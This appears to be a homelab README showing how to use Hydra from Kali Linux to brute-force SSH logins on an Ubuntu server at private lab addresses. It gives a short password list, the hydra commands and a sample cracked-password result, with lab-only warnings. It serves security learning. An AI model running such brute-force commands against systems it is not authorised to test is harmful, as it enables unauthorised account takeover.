# 🔐 Hydra SSH Brute-Force Attack (Homelab Project)

This project demonstrates how to use **Hydra** from **Kali Linux** to perform a brute-force attack on an Ubuntu Server over SSH. It is strictly for educational purposes and should only be used in your own lab setup.

---

## 🧱 Lab Setup

| Role     | OS         | IP Address        |
|----------|------------|-------------------|
| Attacker | Kali Linux | 192.168.92.10     |
| Target   | Ubuntu     | 192.168.92.11     |

---

## ✅ Requirements

- Hydra tool (`sudo apt install hydra`)
- SSH enabled on the Ubuntu target
- Password list file (`passwords.txt`)
- Username to test (e.g. `sapna`)

---

## 🔹 Step-by-Step Guide

### 🔸 Step 1: Install Hydra

```bash
sudo apt update
sudo apt install hydra -y
```

---

### 🔸 Step 2: Confirm SSH is Running on Target

Run this on the Ubuntu Target (192.168.92.11):

```bash
sudo systemctl start ssh
sudo systemctl enable ssh
```

Check status:

```bash
sudo systemctl status ssh
```

---

### 🔸 Step 3: Test SSH from Kali (optional)

```bash
ssh sapna@192.168.92.11
```

If it asks for password, SSH is working fine.

---

### 🔸 Step 4: Create Password File

On Kali:

```bash
nano passwords.txt
```

Add:

```
123456
sapna123
admin
1234
toor
password
```

Save with `Ctrl + O`, exit with `Ctrl + X`

---

### 🔸 Step 5: Run Hydra Command

```bash
hydra -l sapna -P passwords.txt ssh://192.168.92.11
```

If you want slow, safe brute-force:

```bash
hydra -l sapna -P passwords.txt -t 1 ssh://192.168.92.11
```

> `-l` → single username  
> `-P` → password file  
> `ssh://` → attack via SSH  
> `-t 1` → 1 connection at a time (slow but safer)

---

### 🔸 Step 6: Output Example

If the password is found, you’ll see:

```
[22][ssh] host: 192.168.92.11   login: sapna   password: 1234
```

🎉 Success! You cracked the password using Hydra.

---

## ⚠️ Warnings

- Use only in your lab or on systems you own.
- Never attack any public or unauthorized server.
- This project is only for learning cybersecurity.

---

## 👩‍💻 Author

Sapna Baranwal  
Cybersecurity Intern | Red Team Enthusiast

---

## 📸 Screenshots

### ✅ Hydra Installation on Kali
![Hydra Install](screenshots/install_hydra.png)

### ✅ Successful SSH from Kali to Ubuntu
![SSH Login](screenshots/kali_ssh_working.png)
